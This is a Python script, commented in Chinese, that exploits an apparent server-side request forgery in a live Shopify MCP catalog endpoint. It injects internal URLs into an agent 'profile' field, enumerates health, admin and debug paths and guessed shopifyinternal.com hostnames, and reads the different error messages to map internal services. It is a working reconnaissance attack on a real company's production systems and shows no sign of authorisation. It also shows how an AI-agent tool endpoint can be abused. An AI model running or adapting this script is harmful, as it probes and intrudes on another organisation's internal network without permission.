# -*- coding: utf-8 -*-
"""SSRF 深化:内网服务路径枚举 + 内网域名盲测
错误分类(信息泄露通道):
  - Connection timeout  = 端口可达(连接被接受但无响应)/ 防火墙 drop
  - Http error          = 有 HTTPS 服务返回了非预期 HTTP 响应
  - Missing ucp version = 返回了 2xx JSON 并被服务端解析 -> 响应内容被读取!
  - Network error       = DNS 解析失败 / TLS 失败
"""
import time, sys
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        print(f"[{label}] {dt:.1f}s | {r.text[:200]}", flush=True)
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s {type(e).__name__}", flush=True)

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "paths"
    base = "https://shop-server.sfe.shopifyinternal.com"
    if mode == "paths":
        paths = [
            "/", "/health", "/healthz", "/status", "/api", "/api/v1",
            "/v1", "/v2", "/metrics", "/debug", "/internal", "/internal/health",
            "/ping", "/version", "/info", "/service/health", "/.well-known/health",
            "/api/health", "/api/status", "/graphql", "/admin", "/login",
        ]
        for p in paths:
            probe(f"path{p}", base + p)
            time.sleep(0.3)
    elif mode == "hosts":
        hosts = [
            "shop-server.sfe.shopifyinternal.com",
            "admin.sfe.shopifyinternal.com",
            "api.sfe.shopifyinternal.com",
            "checkout.sfe.shopifyinternal.com",
            "catalog.sfe.shopifyinternal.com",
            "ucp.sfe.shopifyinternal.com",
            "sfe.sfe.shopifyinternal.com",
            "sfe.shopifyinternal.com",
            "shopifyinternal.com",
            "www.sfe.shopifyinternal.com",
            "store.sfe.shopifyinternal.com",
            "shops.sfe.shopifyinternal.com",
            "graphql.sfe.shopifyinternal.com",
            "internal.sfe.shopifyinternal.com",
            "service.sfe.shopifyinternal.com",
            "metadata.sfe.shopifyinternal.com",
            "web.sfe.shopifyinternal.com",
            "shop-server.shopifysvc.com",
            "shop-server.shop.dev",
        ]
        for h in hosts:
            probe(f"host-{h.split('.')[0]}", "https://" + h + "/")
            time.sleep(0.3)
